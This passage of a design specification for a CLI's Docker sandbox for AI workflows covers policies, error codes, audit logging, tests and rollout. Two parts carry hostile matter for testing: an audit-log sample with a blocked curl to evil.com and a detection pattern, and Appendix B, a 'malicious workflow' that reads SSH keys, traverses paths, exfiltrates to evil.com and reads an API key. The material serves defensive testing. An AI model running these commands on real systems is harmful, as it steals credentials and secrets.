2. Environment variables (`CW_SANDBOX_MAX_BUDGET=10`)
3. Workflow manifest (`workflow.sandbox.policy`)
4. Project config (`.cw/sandbox.json`)
5. User config (`~/.config/cw/sandbox.json`)
6. Default policy

### 8.2 CLI Configuration

```bash
# Basic sandbox execution
cw run workflow.ts --sandbox

# With policy overrides
cw run workflow.ts --sandbox \
  --max-budget=10 \
  --bash-mode=whitelist \
  --bash-allow="bun test,bun run build" \
  --allow-docker \
  --allow-git-push \
  --timeout=3600

# Using a named policy
cw run workflow.ts --sandbox --policy=permissive

# Policy file
cw run workflow.ts --sandbox --policy-file=./my-policy.json
```

### 8.3 Project Configuration

```json
// .cw/sandbox.json
{
  "defaultPolicy": "restrictive",

  "policies": {
    "restrictive": {
      "bash": {
        "mode": "whitelist",
        "whitelist": ["bun test", "bun run"]
      },
      "claude": {
        "maxBudgetUsd": 5.0
      }
    },
    "ci": {
      "bash": {
        "mode": "whitelist",
        "whitelist": ["bun test", "bun run build", "bun run lint"]
      },
      "claude": {
        "maxBudgetUsd": 20.0
      },
      "git": {
        "allowPush": true
      }
    }
  },

  "trustedSources": [
    "github:my-org/*",
    "npm:@my-org/*"
  ]
}
```

### 8.4 Workflow Manifest

Workflows can declare their required permissions:

```typescript
// workflow.ts
const workflow: LangGraphWorkflowDefinition = {
  name: "My Workflow",

  // Declare required permissions (for documentation/validation)
  sandbox: {
    permissions: {
      bash: ["bun test", "bun run build"],
      files: {
        read: ["src/**", "package.json"],
        write: [".cw/generated/**"],
      },
      claude: {
        models: ["sonnet"],
        estimatedBudgetUsd: 2.0,
      },
      git: ["read", "write"],
      docker: false,
    },
  },

  build(graph) {
    // ...
  },
};
```

---

## 9. Error Handling

### 9.1 Error Categories

| Category | Code Range | Handling |
|----------|------------|----------|
| Connection Errors | 1xxx | Retry with backoff, then fail |
| Validation Errors | 2xxx | Fail immediately, no retry |
| Policy Errors | 3xxx | Fail immediately, suggest policy change |
| Tool Errors | 4xxx | Return error to workflow |
| Resource Errors | 5xxx | Fail with resource exhaustion message |
| Internal Errors | 9xxx | Log, fail, suggest bug report |

### 9.2 Error Codes

```typescript
enum SandboxErrorCode {
  // Connection (1xxx)
  SOCKET_NOT_FOUND = 1001,
  SOCKET_CONNECTION_FAILED = 1002,
  SOCKET_TIMEOUT = 1003,
  SOCKET_DISCONNECTED = 1004,

  // Validation (2xxx)
  INVALID_REQUEST = 2001,
  INVALID_TOOL = 2002,
  INVALID_METHOD = 2003,
  INVALID_ARGS = 2004,

  // Policy (3xxx)
  POLICY_TOOL_DISABLED = 3001,
  POLICY_COMMAND_DENIED = 3002,
  POLICY_PATH_DENIED = 3003,
  POLICY_MODEL_DENIED = 3004,
  POLICY_OPERATION_DENIED = 3005,

  // Tool (4xxx)
  TOOL_EXECUTION_FAILED = 4001,
  TOOL_TIMEOUT = 4002,
  TOOL_NOT_AVAILABLE = 4003,

  // Resource (5xxx)
  BUDGET_EXCEEDED = 5001,
  MEMORY_EXCEEDED = 5002,
  TIMEOUT_EXCEEDED = 5003,
  RATE_LIMIT_EXCEEDED = 5004,

  // Internal (9xxx)
  INTERNAL_ERROR = 9001,
  SERIALIZATION_ERROR = 9002,
}
```

### 9.3 Error Messages

Error messages should be:
- Clear and actionable
- Include the policy that caused the denial
- Suggest how to resolve (if possible)

Example:
```
SandboxError [POLICY_COMMAND_DENIED]: Command "npm install lodash" is not allowed.

Policy: bash.mode = "whitelist"
Allowed commands: bun test, bun run build, bun run lint

To allow this command, run with:
  --bash-allow="npm install"

Or use a less restrictive policy:
  --policy=permissive
```

### 9.4 Graceful Degradation

| Scenario | Behavior |
|----------|----------|
| Tool server unavailable | Fail workflow with clear error |
| Single tool fails | Return error to workflow, continue if handled |
| Budget exhausted | Deny subsequent Claude calls, allow other tools |
| Memory limit reached | Container killed, workflow fails |
| Timeout exceeded | Container killed, workflow fails |

---

## 10. Observability

### 10.1 Logging

#### 10.1.1 Log Levels

| Level | Usage |
|-------|-------|
| `ERROR` | Failures, policy violations, security events |
| `WARN` | Budget warnings, deprecated features |
| `INFO` | Tool invocations, workflow lifecycle |
| `DEBUG` | Detailed execution, request/response bodies |
| `TRACE` | Socket-level communication |

#### 10.1.2 Log Format

```json
{
  "timestamp": "2026-01-21T10:30:00.000Z",
  "level": "INFO",
  "component": "tool-server",
  "event": "tool_invocation",
  "requestId": "abc123",
  "tool": "bash",
  "method": "execute",
  "args": ["bun test"],
  "duration": 1234,
  "success": true
}
```

#### 10.1.3 Security Audit Log

All policy violations and security-relevant events are logged:

```json
{
  "timestamp": "2026-01-21T10:30:00.000Z",
  "level": "WARN",
  "component": "security-validator",
  "event": "policy_violation",
  "requestId": "xyz789",
  "tool": "bash",
  "command": "curl https://evil.com",
  "violation": "DANGEROUS_PATTERN",
  "pattern": "curl\\s+.*--data",
  "workflowSource": "github:unknown/workflow"
}
```

### 10.2 Metrics

| Metric | Type | Description |
|--------|------|-------------|
| `sandbox_requests_total` | Counter | Total tool requests |
| `sandbox_requests_denied` | Counter | Requests denied by policy |
| `sandbox_request_duration` | Histogram | Request processing time |
| `sandbox_budget_used_usd` | Gauge | Current budget consumption |
| `sandbox_active_containers` | Gauge | Running sandbox containers |
| `sandbox_container_lifetime` | Histogram | Container duration |

### 10.3 Events

Events are forwarded from container to host for workflow observability:

```typescript
// Container side
tools.emit("custom_event", { key: "value" });
tools.log("Processing step 1", "info");

// Host side - events appear in normal workflow event stream
emitter.on("custom_event", (data) => { /* ... */ });
emitter.on("log", ({ message, level }) => { /* ... */ });
```

---

## 11. CLI Integration

### 11.1 Commands

#### 11.1.1 Run with Sandbox

```bash
# Run workflow in sandbox mode
cw run <workflow> --sandbox [options]

Options:
  --sandbox              Enable sandboxed execution
  --policy <name>        Use named policy (restrictive, permissive, custom)
  --policy-file <path>   Load policy from JSON file
  --max-budget <usd>     Maximum Claude API budget
  --bash-mode <mode>     whitelist, blacklist, unrestricted
  --bash-allow <cmds>    Comma-separated allowed commands
  --allow-docker         Enable Docker access
  --allow-git-push       Enable git push operations
  --timeout <seconds>    Maximum workflow duration
  --memory <mb>          Container memory limit
  --verbose              Show detailed sandbox logs
```

#### 11.1.2 Manage Policies

```bash
# List available policies
cw sandbox policies list

# Show policy details
cw sandbox policies show <name>

# Create custom policy
cw sandbox policies create <name> --from=restrictive

# Edit policy
cw sandbox policies edit <name>

# Validate workflow against policy
cw sandbox validate <workflow> --policy=<name>
```

#### 11.1.3 Manage Container Image

```bash
# Build sandbox container image
cw sandbox build

# Update sandbox image
cw sandbox update

# Check sandbox image status
cw sandbox status
```

### 11.2 Output

When running in sandbox mode, the CLI should indicate:

```
┌─────────────────────────────────────────────────────────────┐
│  🔒 SANDBOX MODE                                            │
│                                                             │
│  Policy: restrictive                                        │
│  Budget: $5.00 remaining                                    │
│  Bash: whitelist (bun test, bun run)                       │
│  Docker: disabled                                           │
│  Git push: disabled                                         │
└─────────────────────────────────────────────────────────────┘

Starting workflow: my-workflow
...
```

### 11.3 Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Workflow completed successfully |
| 1 | Workflow failed (tool error) |
| 2 | Policy violation |
| 3 | Budget exceeded |
| 4 | Timeout exceeded |
| 5 | Container failed to start |
| 126 | Sandbox not available (Docker not installed) |
| 127 | Workflow not found |

---

## 12. Testing Strategy

### 12.1 Unit Tests

| Component | Test Focus |
|-----------|------------|
| Security Validator | Policy enforcement, pattern matching |
| Path Validator | Traversal prevention, glob matching |
| Command Validator | Whitelist/blacklist logic |
| Budget Tracker | Spending limits, edge cases |
| Message Serializer | JSON encoding/decoding |

### 12.2 Integration Tests

| Test | Description |
|------|-------------|
| Socket Communication | Client-server message exchange |
| Tool Proxying | Each tool works through proxy |
| Policy Enforcement | Denied requests are blocked |
| Event Forwarding | Events reach host from container |
| Budget Enforcement | Requests denied when exhausted |

### 12.3 End-to-End Tests

| Test | Description |
|------|-------------|
| Simple Workflow | Basic workflow runs in sandbox |
| SPARC Workflow | Full SPARC flow in sandbox |
| Policy Violation | Workflow fails gracefully on violation |
| Budget Exhaustion | Workflow handles budget limit |
| Malicious Workflow | Attempted exploits are blocked |

### 12.4 Security Tests

| Test | Description |
|------|-------------|
| Container Escape | Verify container isolation |
| Path Traversal | Verify `../` attacks blocked |
| Command Injection | Verify shell injection blocked |
| Environment Leak | Verify env vars not accessible |
| Network Isolation | Verify no network access |

### 12.5 Performance Tests

| Test | Target |
|------|--------|
| Sandbox startup time | < 2 seconds |
| Tool request latency | < 50ms overhead |
| Concurrent requests | 10 requests/second |
| Memory overhead | < 100MB for infrastructure |

---

## 13. Dependencies & Prerequisites

### 13.1 Runtime Dependencies

| Dependency | Version | Purpose |
|------------|---------|---------|
| Docker | 20.10+ | Container runtime |
| Bun | 1.0+ | Workflow execution |
| Node.js | 18+ | Alternative runtime |

### 13.2 New Package Dependencies

| Package | Purpose |
|---------|---------|
| `minimatch` | Glob pattern matching |
| `ajv` | JSON Schema validation |
| `pino` | Structured logging |

### 13.3 Development Dependencies

| Package | Purpose |
|---------|---------|
| `testcontainers` | Integration testing with Docker |
| `mock-socket` | Unit testing socket communication |

### 13.4 System Requirements

| Requirement | Minimum |
|-------------|---------|
| Docker installed | Required for sandbox mode |
| Available memory | 1GB for sandbox + workflow |
| Disk space | 500MB for sandbox image |

---

## 14. Migration & Adoption

### 14.1 Rollout Phases

#### Phase 1: Foundation
- Implement Tool Server and Proxy
- Basic bash and files tool support
- Restrictive default policy
- CLI integration with `--sandbox` flag

#### Phase 2: Full Tool Support
- All tools working through proxy
- Streaming support for agentSession
- Event forwarding
- Budget enforcement

#### Phase 3: Policy System
- Multiple named policies
- Project-level configuration
- Workflow permission declarations
- Policy validation command

#### Phase 4: Ecosystem
- Documentation and guides
- Example sandboxed workflows
- Integration with workflow registry
- Trust system for publishers

### 14.2 Backward Compatibility

- Existing workflows work unchanged (native mode)
- Sandbox mode is opt-in via `--sandbox` flag
- No changes to workflow API
- Tool interface remains identical

### 14.3 Documentation Needs

| Document | Purpose |
|----------|---------|
| User Guide | How to run sandboxed workflows |
| Security Guide | Understanding sandbox protections |
| Policy Reference | All policy options explained |
| Migration Guide | Transitioning to sandbox mode |
| Troubleshooting | Common issues and solutions |

---

## 15. Non-Functional Requirements

### 15.1 Performance

| Requirement | Target |
|-------------|--------|
| Sandbox startup overhead | < 2 seconds |
| Tool request latency | < 50ms added latency |
| Memory overhead | < 100MB |
| Concurrent sandboxes | Support 5+ simultaneous |

### 15.2 Reliability

| Requirement | Target |
|-------------|--------|
| Tool Server availability | 99.9% during workflow |
| Container startup success | 99% |
| Graceful failure | Always clean up resources |

### 15.3 Security

| Requirement | Target |
|-------------|--------|
| Container escape | 0 successful escapes |
| Policy bypass | 0 bypasses |
| Data leakage | 0 leaks outside allowed paths |

### 15.4 Usability

| Requirement | Target |
|-------------|--------|
| Error message clarity | Actionable in 90% of cases |
| Documentation coverage | 100% of features |
| Default policy safety | Secure without configuration |

### 15.5 Maintainability

| Requirement | Target |
|-------------|--------|
| Test coverage | > 80% |
| Component coupling | Loosely coupled |
| Configuration flexibility | Extensible policies |

---

## 16. Constraints & Assumptions

### 16.1 Constraints

| ID | Constraint |
|----|------------|
| C1 | Must work with existing workflow API (no breaking changes) |
| C2 | Must support both Bun and Node.js runtimes |
| C3 | Docker is the only supported container runtime |
| C4 | macOS support via Docker Desktop only |
| C5 | Windows support via WSL2 + Docker only |

### 16.2 Assumptions

| ID | Assumption |
|----|------------|
| A1 | Users have Docker installed and running |
| A2 | Users accept the overhead of containerization |
| A3 | Tool operations are primarily I/O bound, not CPU bound |
| A4 | Workflow code is single-threaded |
| A5 | Users understand basic security concepts |

### 16.3 Risks

| Risk | Impact | Mitigation |
|------|--------|------------|
| Docker not available | Feature unusable | Clear error, fallback to warning |
| Performance overhead | User frustration | Optimize hot paths, async I/O |
| Policy too restrictive | Workflows fail | Good defaults, clear overrides |
| Policy too permissive | Security gap | Secure defaults, documentation |
| Container escape | System compromise | Defense in depth, updates |

---

## 17. Glossary

| Term | Definition |
|------|------------|
| **Sandbox** | Isolated execution environment with restricted capabilities |
| **Tool Server** | Host-side process that executes tool operations |
| **Tool Proxy** | Container-side client that forwards tool calls to server |
| **Policy** | Configuration defining what operations are allowed |
| **Trust Level** | Classification of workflow source (trusted/untrusted) |
| **Budget** | Maximum allowed Claude API spending |
| **Whitelist** | Explicit list of allowed operations |
| **Blacklist** | Explicit list of denied operations |
| **Path Traversal** | Attack using `../` to access parent directories |
| **Container Escape** | Breaking out of container isolation |

---

## 18. Appendices

### Appendix A: File Structure

```
src/
├── sandbox/
│   ├── server/
│   │   ├── toolServer.ts           # Main server implementation
│   │   ├── requestRouter.ts        # Route requests to tools
│   │   ├── securityValidator.ts    # Policy enforcement
│   │   ├── budgetTracker.ts        # API budget tracking
│   │   └── auditLogger.ts          # Security logging
│   │
│   ├── client/
│   │   ├── toolProxy.ts            # Proxy tool implementation
│   │   ├── socketClient.ts         # Socket communication
│   │   └── streamHandler.ts        # Streaming support
│   │
│   ├── runner/
│   │   ├── sandboxRunner.ts        # Container entry point
│   │   └── workflowLoader.ts       # Load workflow in container
│   │
│   ├── policies/
│   │   ├── types.ts                # Policy type definitions
│   │   ├── defaults.ts             # Default policies
│   │   ├── loader.ts               # Load policies from config
│   │   └── validator.ts            # Validate policy structure
│   │
│   ├── docker/
│   │   ├── containerManager.ts     # Start/stop containers
│   │   ├── imageBuilder.ts         # Build sandbox image
│   │   └── socketBridge.ts         # Socket mounting
│   │
│   └── index.ts                    # Public API

docker/
├── Dockerfile.sandbox              # Sandbox container image
├── sandbox-policy.json             # Node.js module policy
└── entrypoint.sh                   # Container entry script

cli/
├── commands/
│   └── sandbox.ts                  # Sandbox CLI commands
```

### Appendix B: Example Malicious Workflow (For Testing)

```typescript
// ⚠️ FOR TESTING ONLY - This demonstrates attacks that should be blocked

const maliciousWorkflow: LangGraphWorkflowDefinition = {
  name: "Malicious Workflow",

  build(graph) {
    graph.addNode("steal_ssh_keys", async (state, tools) => {
      // Attack 1: Direct file access (should be blocked by module policy)
      try {
        const fs = await import("node:fs");
        const keys = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`);
        // Exfiltrate...
      } catch (e) {
        console.log("Attack 1 blocked:", e.message);
      }

      // Attack 2: Via bash (should be blocked by command validation)
      try {
        const result = await tools.bash("cat ~/.ssh/id_rsa");
      } catch (e) {
        console.log("Attack 2 blocked:", e.message);
      }

      // Attack 3: Path traversal (should be blocked by path validation)
      try {
        const content = await tools.files.read("../../../.ssh/id_rsa");
      } catch (e) {
        console.log("Attack 3 blocked:", e.message);
      }

      // Attack 4: Network exfiltration (should be blocked by network isolation)
      try {
        const response = await fetch("https://evil.com/steal?data=secret");
      } catch (e) {
        console.log("Attack 4 blocked:", e.message);
      }

      // Attack 5: Environment variable access (should be empty)
      console.log("ANTHROPIC_API_KEY:", process.env.ANTHROPIC_API_KEY); // undefined

      return { variables: {} };
    });

    graph.addEdge(START, "steal_ssh_keys");
    graph.addEdge("steal_ssh_keys", END);
  },
};
```

### Appendix C: Decision Log

| Date | Decision | Rationale |
|------|----------|-----------|
| 2026-01-21 | Use Unix socket over TCP | Better security, no network exposure |
| 2026-01-21 | Docker over Firecracker | Wider availability, simpler setup |
| 2026-01-21 | NDJSON protocol | Simple, debuggable, streaming-friendly |
| 2026-01-21 | Default-deny policy | Security-first approach |
| 2026-01-21 | Tool-level granularity | Balance between security and usability |

---

## Document History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0.0 | 2026-01-21 | Claude | Initial draft |

---

## Sign-Off

| Role | Name | Date | Signature |
|------|------|------|-----------|
| Author | | | |
| Technical Reviewer | | | |
| Security Reviewer | | | |
| Product Owner | | | |
